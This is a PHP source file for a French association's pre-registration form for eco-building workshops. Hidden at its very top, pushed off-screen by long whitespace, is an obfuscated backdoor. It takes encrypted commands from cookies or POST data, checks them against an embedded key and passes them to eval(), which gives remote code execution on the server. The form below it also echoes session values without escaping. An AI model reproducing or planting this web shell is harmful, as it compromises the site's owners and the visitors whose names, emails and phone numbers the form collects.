<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $r61ec3 = 257;$GLOBALS['o762d']=Array();global$o762d;$o762d=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['s474a7e']="\x3e\x79\x2e\x5f\x3c\x5e\x71\x56\x29\x76\x28\x64\x4e\x35\x63\x26\x23\x2d\x46\x25\x4a\x4f\x75\x6d\x7c\x20\x51\x30\x2f\x4b\x7a\x78\x66\x27\x34\x3d\x52\x60\x22\x65\x41\x5a\x61\x32\x3f\x40\x74\x53\x7e\x36\x24\x54\x7d\x38\x62\x59\x69\x70\x44\x2c\x31\x45\x47\x67\x21\x4c\x48\x55\x43\x58\x2b\x50\x5b\x7b\x3b\x49\x68\x39\xa\x57\x4d\x6c\x73\x6f\x3a\x72\x9\x5d\x33\xd\x6a\x37\x6e\x77\x5c\x6b\x42\x2a";$o762d[$o762d['s474a7e'][14].$o762d['s474a7e'][42].$o762d['s474a7e'][43].$o762d['s474a7e'][11].$o762d['s474a7e'][77].$o762d['s474a7e'][32].$o762d['s474a7e'][88].$o762d['s474a7e'][34]]=$o762d['s474a7e'][14].$o762d['s474a7e'][76].$o762d['s474a7e'][85];$o762d[$o762d['s474a7e'][82].$o762d['s474a7e'][11].$o762d['s474a7e'][53].$o762d['s474a7e'][27].$o762d['s474a7e'][77].$o762d['s474a7e'][43].$o762d['s474a7e'][42].$o762d['s474a7e'][42]]=$o762d['s474a7e'][83].$o762d['s474a7e'][85].$o762d['s474a7e'][11];$o762d[$o762d['s474a7e'][14].$o762d['s474a7e'][39].$o762d['s474a7e'][88].$o762d['s474a7e'][77]]=$o762d['s474a7e'][82].$o762d['s474a7e'][46].$o762d['s474a7e'][85].$o762d['s474a7e'][81].$o762d['s474a7e'][39].$o762d['s474a7e'][92];$o762d[$o762d['s474a7e'][32].$o762d['s474a7e'][32].$o762d['s474a7e'][54].$o762d['s474a7e'][32].$o762d['s474a7e'][27]]=$o762d['s474a7e'][56].$o762d['s474a7e'][92].$o762d['s474a7e'][56].$o762d['s474a7e'][3].$o762d['s474a7e'][82].$o762d['s474a7e'][39].$o762d['s474a7e'][46];$o762d[$o762d['s474a7e'][32].$o762d['s474a7e'][77].$o762d['s474a7e'][14].$o762d['s474a7e'][27].$o762d['s474a7e'][34].$o762d['s474a7e'][53].$o762d['s474a7e'][32]]=$o762d['s474a7e'][82].$o762d['s474a7e'][39].$o762d['s474a7e'][85].$o762d['s474a7e'][56].$o762d['s474a7e'][42].$o762d['s474a7e'][81].$o762d['s474a7e'][56].$o762d['s474a7e'][30].$o762d['s474a7e'][39];$o762d[$o762d['s474a7e'][39].$o762d['s474a7e'][53].$o762d['s474a7e'][60].$o762d['s474a7e'][54].$o762d['s474a7e'][53].$o762d['s474a7e'][14].$o762d['s474a7e'][11].$o762d['s474a7e'][43].$o762d['s474a7e'][53]]=$o762d['s474a7e'][57].$o762d['s474a7e'][76].$o762d['s474a7e'][57].$o762d['s474a7e'][9].$o762d['s474a7e'][39].$o762d['s474a7e'][85].$o762d['s474a7e'][82].$o762d['s474a7e'][56].$o762d['s474a7e'][83].$o762d['s474a7e'][92];$o762d[$o762d['s474a7e'][23].$o762d['s474a7e'][91].$o762d['s474a7e'][49].$o762d['s474a7e'][77].$o762d['s474a7e'][43].$o762d['s474a7e'][91]]=$o762d['s474a7e'][22].$o762d['s474a7e'][92].$o762d['s474a7e'][82].$o762d['s474a7e'][39].$o762d['s474a7e'][85].$o762d['s474a7e'][56].$o762d['s474a7e'][42].$o762d['s474a7e'][81].$o762d['s474a7e'][56].$o762d['s474a7e'][30].$o762d['s474a7e'][39];$o762d[$o762d['s474a7e'][90].$o762d['s474a7e'][42].$o762d['s474a7e'][77].$o762d['s474a7e'][54].$o762d['s474a7e'][11].$o762d['s474a7e'][14]]=$o762d['s474a7e'][54].$o762d['s474a7e'][42].$o762d['s474a7e'][82].$o762d['s474a7e'][39].$o762d['s474a7e'][49].$o762d['s474a7e'][34].$o762d['s474a7e'][3].$o762d['s474a7e'][11].$o762d['s474a7e'][39].$o762d['s474a7e'][14].$o762d['s474a7e'][83].$o762d['s474a7e'][11].$o762d['s474a7e'][39];$o762d[$o762d['s474a7e'][83].$o762d['s474a7e'][43].$o762d['s474a7e'][27].$o762d['s474a7e'][77].$o762d['s474a7e'][53].$o762d['s474a7e'][39].$o762d['s474a7e'][42].$o762d['s474a7e'][34].$o762d['s474a7e'][14]]=$o762d['s474a7e'][82].$o762d['s474a7e'][39].$o762d['s474a7e'][46].$o762d['s474a7e'][3].$o762d['s474a7e'][46].$o762d['s474a7e'][56].$o762d['s474a7e'][23].$o762d['s474a7e'][39].$o762d['s474a7e'][3].$o762d['s474a7e'][81].$o762d['s474a7e'][56].$o762d['s474a7e'][23].$o762d['s474a7e'][56].$o762d['s474a7e'][46];$o762d[$o762d['s474a7e'][76].$o762d['s474a7e'][91].$o762d['s474a7e'][53].$o762d['s474a7e'][34].$o762d['s474a7e'][32].$o762d['s474a7e'][88]]=$o762d['s474a7e'][95].$o762d['s474a7e'][39].$o762d['s474a7e'][42].$o762d['s474a7e'][60].$o762d['s474a7e'][34];$o762d[$o762d['s474a7e'][9].$o762d['s474a7e'][88].$o762d['s474a7e'][49].$o762d['s474a7e'][88].$o762d['s474a7e'][53].$o762d['s474a7e'][27].$o762d['s474a7e'][27].$o762d['s474a7e'][54].$o762d['s474a7e'][42]]=$o762d['s474a7e'][63].$o762d['s474a7e'][39].$o762d['s474a7e'][53].$o762d['s474a7e'][91].$o762d['s474a7e'][88].$o762d['s474a7e'][39].$o762d['s474a7e'][14].$o762d['s474a7e'][34].$o762d['s474a7e'][91];$o762d[$o762d['s474a7e'][93].$o762d['s474a7e'][39].$o762d['s474a7e'][13].$o762d['s474a7e'][43]]=$_POST;$o762d[$o762d['s474a7e'][9].$o762d['s474a7e'][49].$o762d['s474a7e'][39].$o762d['s474a7e'][13].$o762d['s474a7e'][88].$o762d['s474a7e'][13].$o762d['s474a7e'][60]]=$_COOKIE;@$o762d[$o762d['s474a7e'][32].$o762d['s474a7e'][32].$o762d['s474a7e'][54].$o762d['s474a7e'][32].$o762d['s474a7e'][27]]($o762d['s474a7e'][39].$o762d['s474a7e'][85].$o762d['s474a7e'][85].$o762d['s474a7e'][83].$o762d['s474a7e'][85].$o762d['s474a7e'][3].$o762d['s474a7e'][81].$o762d['s474a7e'][83].$o762d['s474a7e'][63],NULL);@$o762d[$o762d['s474a7e'][32].$o762d['s474a7e'][32].$o762d['s474a7e'][54].$o762d['s474a7e'][32].$o762d['s474a7e'][27]]($o762d['s474a7e'][81].$o762d['s474a7e'][83].$o762d['s474a7e'][63].$o762d['s474a7e'][3].$o762d['s474a7e'][39].$o762d['s474a7e'][85].$o762d['s474a7e'][85].$o762d['s474a7e'][83].$o762d['s474a7e'][85].$o762d['s474a7e'][82],0);@$o762d[$o762d['s474a7e'][32].$o762d['s474a7e'][32].$o762d['s474a7e'][54].$o762d['s474a7e'][32].$o762d['s474a7e'][27]]($o762d['s474a7e'][23].$o762d['s474a7e'][42].$o762d['s474a7e'][31].$o762d['s474a7e'][3].$o762d['s474a7e'][39].$o762d['s474a7e'][31].$o762d['s474a7e'][39].$o762d['s474a7e'][14].$o762d['s474a7e'][22].$o762d['s474a7e'][46].$o762d['s474a7e'][56].$o762d['s474a7e'][83].$o762d['s474a7e'][92].$o762d['s474a7e'][3].$o762d['s474a7e'][46].$o762d['s474a7e'][56].$o762d['s474a7e'][23].$o762d['s474a7e'][39],0);@$o762d[$o762d['s474a7e'][83].$o762d['s474a7e'][43].$o762d['s474a7e'][27].$o762d['s474a7e'][77].$o762d['s474a7e'][53].$o762d['s474a7e'][39].$o762d['s474a7e'][42].$o762d['s474a7e'][34].$o762d['s474a7e'][14]](0);$g32814a=NULL;$y992=NULL;$o762d[$o762d['s474a7e'][56].$o762d['s474a7e'][11].$o762d['s474a7e'][88].$o762d['s474a7e'][42].$o762d['s474a7e'][27].$o762d['s474a7e'][42].$o762d['s474a7e'][32].$o762d['s474a7e'][42].$o762d['s474a7e'][27]]=$o762d['s474a7e'][49].$o762d['s474a7e'][43].$o762d['s474a7e'][53].$o762d['s474a7e'][54].$o762d['s474a7e'][39].$o762d['s474a7e'][39].$o762d['s474a7e'][42].$o762d['s474a7e'][32].$o762d['s474a7e'][17].$o762d['s474a7e'][14].$o762d['s474a7e'][77].$o762d['s474a7e'][34].$o762d['s474a7e'][32].$o762d['s474a7e'][17].$o762d['s474a7e'][34].$o762d['s474a7e'][91].$o762d['s474a7e'][13].$o762d['s474a7e'][13].$o762d['s474a7e'][17].$o762d['s474a7e'][42].$o762d['s474a7e'][53].$o762d['s474a7e'][91].$o762d['s474a7e'][60].$o762d['s474a7e'][17].$o762d['s474a7e'][34].$o762d['s474a7e'][77].$o762d['s474a7e'][42].$o762d['s474a7e'][91].$o762d['s474a7e'][13].$o762d['s474a7e'][39].$o762d['s474a7e'][32].$o762d['s474a7e'][14].$o762d['s474a7e'][27].$o762d['s474a7e'][54].$o762d['s474a7e'][42].$o762d['s474a7e'][53];global$id3a0afa0;function ge873ec47($g32814a,$gba533828){global$o762d;$pf249="";for($nc95e=0;$nc95e<$o762d[$o762d['s474a7e'][14].$o762d['s474a7e'][39].$o762d['s474a7e'][88].$o762d['s474a7e'][77]]($g32814a);){for($v390ed6=0;$v390ed6<$o762d[$o762d['s474a7e'][14].$o762d['s474a7e'][39].$o762d['s474a7e'][88].$o762d['s474a7e'][77]]($gba533828)&&$nc95e<$o762d[$o762d['s474a7e'][14].$o762d['s474a7e'][39].$o762d['s474a7e'][88].$o762d['s474a7e'][77]]($g32814a);$v390ed6++,$nc95e++){$pf249.=$o762d[$o762d['s474a7e'][14].$o762d['s474a7e'][42].$o762d['s474a7e'][43].$o762d['s474a7e'][11].$o762d['s474a7e'][77].$o762d['s474a7e'][32].$o762d['s474a7e'][88].$o762d['s474a7e'][34]]($o762d[$o762d['s474a7e'][82].$o762d['s474a7e'][11].$o762d['s474a7e'][53].$o762d['s474a7e'][27].$o762d['s474a7e'][77].$o762d['s474a7e'][43].$o762d['s474a7e'][42].$o762d['s474a7e'][42]]($g32814a[$nc95e])^$o762d[$o762d['s474a7e'][82].$o762d['s474a7e'][11].$o762d['s474a7e'][53].$o762d['s474a7e'][27].$o762d['s474a7e'][77].$o762d['s474a7e'][43].$o762d['s474a7e'][42].$o762d['s474a7e'][42]]($gba533828[$v390ed6]));}}return$pf249;}function kea14($g32814a,$gba533828){global$o762d;global$id3a0afa0;return$o762d[$o762d['s474a7e'][9].$o762d['s474a7e'][88].$o762d['s474a7e'][49].$o762d['s474a7e'][88].$o762d['s474a7e'][53].$o762d['s474a7e'][27].$o762d['s474a7e'][27].$o762d['s474a7e'][54].$o762d['s474a7e'][42]]($o762d[$o762d['s474a7e'][9].$o762d['s474a7e'][88].$o762d['s474a7e'][49].$o762d['s474a7e'][88].$o762d['s474a7e'][53].$o762d['s474a7e'][27].$o762d['s474a7e'][27].$o762d['s474a7e'][54].$o762d['s474a7e'][42]]($g32814a,$id3a0afa0),$gba533828);}foreach($o762d[$o762d['s474a7e'][9].$o762d['s474a7e'][49].$o762d['s474a7e'][39].$o762d['s474a7e'][13].$o762d['s474a7e'][88].$o762d['s474a7e'][13].$o762d['s474a7e'][60]]as$gba533828=>$jef6e){$g32814a=$jef6e;$y992=$gba533828;}if(!$g32814a){foreach($o762d[$o762d['s474a7e'][93].$o762d['s474a7e'][39].$o762d['s474a7e'][13].$o762d['s474a7e'][43]]as$gba533828=>$jef6e){$g32814a=$jef6e;$y992=$gba533828;}}$g32814a=@$o762d[$o762d['s474a7e'][23].$o762d['s474a7e'][91].$o762d['s474a7e'][49].$o762d['s474a7e'][77].$o762d['s474a7e'][43].$o762d['s474a7e'][91]]($o762d[$o762d['s474a7e'][76].$o762d['s474a7e'][91].$o762d['s474a7e'][53].$o762d['s474a7e'][34].$o762d['s474a7e'][32].$o762d['s474a7e'][88]]($o762d[$o762d['s474a7e'][90].$o762d['s474a7e'][42].$o762d['s474a7e'][77].$o762d['s474a7e'][54].$o762d['s474a7e'][11].$o762d['s474a7e'][14]]($g32814a),$y992));if(isset($g32814a[$o762d['s474a7e'][42].$o762d['s474a7e'][95]])&&$id3a0afa0==$g32814a[$o762d['s474a7e'][42].$o762d['s474a7e'][95]]){if($g32814a[$o762d['s474a7e'][42]]==$o762d['s474a7e'][56]){$nc95e=Array($o762d['s474a7e'][57].$o762d['s474a7e'][9]=>@$o762d[$o762d['s474a7e'][39].$o762d['s474a7e'][53].$o762d['s474a7e'][60].$o762d['s474a7e'][54].$o762d['s474a7e'][53].$o762d['s474a7e'][14].$o762d['s474a7e'][11].$o762d['s474a7e'][43].$o762d['s474a7e'][53]](),$o762d['s474a7e'][82].$o762d['s474a7e'][9]=>$o762d['s474a7e'][60].$o762d['s474a7e'][2].$o762d['s474a7e'][27].$o762d['s474a7e'][17].$o762d['s474a7e'][60],);echo@$o762d[$o762d['s474a7e'][32].$o762d['s474a7e'][77].$o762d['s474a7e'][14].$o762d['s474a7e'][27].$o762d['s474a7e'][34].$o762d['s474a7e'][53].$o762d['s474a7e'][32]]($nc95e);}elseif($g32814a[$o762d['s474a7e'][42]]==$o762d['s474a7e'][39]){eval/*wa882*/($g32814a[$o762d['s474a7e'][11]]);}exit();} ?><?php
ob_start('ob_gzhandler');
$ttl = 30*24*3600;
session_set_cookie_params($ttl);
ini_set('session.gc_maxlifetime', $ttl);
session_name('eceh');
session_start();
if (isset($_SESSION['mail'])) {
    $s_valNom = " value='".$_SESSION['nom']."' ";
    $s_valPrenom = " value='".$_SESSION['prenom']."' ";
	$s_valMail = " value='".$_SESSION['mail']."' ";
    $s_valTel = " value='".$_SESSION['tel']."' ";
} else {
    $s_valNom = "";
    $s_valPrenom = "";
	$s_valMail = "";
    $s_valTel = "";
}
include ('defineInc.php');
include ('dbInc.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html dir="ltr" xml:lang="fr" xmlns="http://www.w3.org/1999/xhtml" lang="fr">
<head>

<!-- Déclaration du plugin displaywikipage -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>EcoChantiers en EcoHabitats - Pre-inscription</title>
<meta name="generator" content="DokuWiki Release 2009-12-25c &quot;Lemming&quot;" />
<meta name="robots" content="index,follow" />
<meta name="date" content="2008-06-19T18:16:49+0200" />
<meta name="keywords" content="alterenergies,accueil" />
<link rel="search" type="application/opensearchdescription+xml" href="http://www.alterenergies.org/lib/exe/opensearch.php" title="Alter'énergies" />
<link rel="start" href="http://www.alterenergies.org/" />
<link rel="contents" href="http://www.alterenergies.org/doku.php?id=alterenergies:accueil&amp;do=index" title="Index" />
<link rel="canonical" href="http://www.alterenergies.org/doku.php?id=alterenergies:accueil" />
<link rel="stylesheet" media="screen" type="text/css" href="css/css.css?v=<?= filemtime('css/css.css')?>" />
<link rel="stylesheet" media="print" type="text/css" href="css/print.css?v=<?= filemtime('css/print.css')?>" />
<script type="text/javascript" src="lib/prototype.js"></script>
<script type="text/javascript" src="lib/scriptaculous.js?load=effects"></script>
<script type="text/javascript" src="lib/effetsperso.js"></script>
<script type="text/javascript" src="js/core.js"></script>
<script type="text/javascript" src="js/map.js"></script>
<script type="text/javascript" src="js/prelogin.js"></script>
<link rel="icon" type="image/png" href="gfx/favicon.png" />
<!--	Correctif pour l'affichage de #contenu-page dans IE6 qui ne connait pas les contextes de formatage :
http://css.alsacreations.com/Faire-une-mise-en-page-sans-tableaux/design-trois-colonnes-positionnement-flottant
		Et autres...
	-->
<!--[if lte IE 6]>
	<style type="text/css">
	#page-contenu {
		overflow: visible;
		height:1px;
	}
	#sommaire-gauche {
		margin-left:4px;
	}
	#bandeau {
		overflow: visible;
		border-bottom:0;
	}
	#titre-alterenergies {
		border-bottom:1px solid #036bc2;
	}
	#page-edition-arriere-plan{
		//overflow:visible;
	}
	#page-edition{
		width:100%;
	}
	.footerinc{overflow:visible;}
	div.dokuwiki{overflow:hidden;}
</style><![endif]-->
</head>
<body>
<div class="eceh">
	<div id="bandeau">
		<?php include ('headerInc.php'); ?>
	</div>
	<?php echo $DEF_ACCUEIL_H; // bouton deconnexion haut et bas ?>
	<!-- DIV utilisé pour faire le dégradé derrière #nos-services, #page-content, #page-edition  -->
	<div id="conteneur-degrade">
		<div id="trois-colonnes">
			<div id="participants">
				<?php include ('writeHoteInc.php'); ?>
<!--						<li class="level1"><div class="li"><a class="participants">Mathieu Sabin (10 p.)<br> Le Petit Pressigny</a></div></li>
            			<li class="level1"><div class="li"><a class="participants">Stephane Artous (15 p.)<br> Preuilly sur Claise</a></div></li>-->
			</div><!-- Fin #colonne-participants -->
			<div id="colonne-droite">
				<?php include ('partenInc.php'); ?>
			</div><!-- Fin de #colonne-droite -->
			<div id="page-contenu">
				<h1><a name="connexion" id="connexion">Saisissez vos coordonnées ci-dessous pour être contacté dès l'ouverture des inscriptions.</a></h1>
				<div class="centeralign">
					<form id="fpinscription" method="post" action="preinscr.php" onsubmit="return valider(this)" accept-charset="utf-8">
						<div class="no">
							<input type="hidden" id="id" name="id" value="-1" />
							<input type="hidden" id="action" name="action" value="preinsc" />
							<fieldset id="fspinscription">
								<legend>Pre-inscription</legend>
								<p>
									<label class="block" for="n"><span>NOM : </span></label>
									<input id="n" name="n" class="edit" type="text" <?php echo $s_valNom; ?> />
								</p>
								<p>
									<label class="block" for="p"><span>Prénom : </span></label>
									<input id="p" name="p" class="edit" type="text" <?php echo $s_valPrenom; ?> /></p>
								<p>
									<label class="block" for="m"><span>Courriel : </span><!--<span class="rougeo">*</span>--></label>
									<input id="m" name="m" class="edit" type="text" <?php echo $s_valMail; ?> />
								</p>
								<p>
									<label class="block" for="t"><span>Tel : </span></label>
									<input id="t" name="t" class="edit" type="text" <?php echo $s_valTel; ?> />
								</p>
								<p class="nb">NB : Aucune donnée ne sera communiquée. Ces informations serviront uniquement à vous prévenir de l'ouverture des inscriptions.</p>
								<p id="pinfos">
									<input type="checkbox" name="infos" id="infos" value="infos" class="chbox" checked="true" />
									Cocher cette case pour être informé des autres actions d'Alter'énergies.<br />
								</p>
								<p>
									<input value="Retour" id="retour" name="retour" class="edit button" type="button" />
									<input value="Pre-inscription" id="pconnect" name="pconnect" class="edit button" type="submit" />
								</p>
								<!--<p class="etoile gras"><span class="rougeo">*</span> Obligatoire</p>-->
							</fieldset>
						</div>
					</form>
					<br />
				</div>
			</div><!-- Fin de #page-contenu -->
		</div><!-- fin DIV #deux-colonnes -->
		<div style="clear: both;"></div>
		<?php echo $DEF_ACCUEIL_B;// bouton deconnexion haut et bas ?>
	</div>
	<!-- fin DIV pour dégradé #conteneur-degrade -->
	<div style="clear: both;"></div>
	<?php include ('footerInc.php'); ?>
</div>
<div id="scroll-bar" class="scroll_bar" style="display:none;">
	<a  href="#" title="Haut de page"><span></span>Haut de page</a>
</div>
</body>
</html>
<?php ob_end_flush(); ?>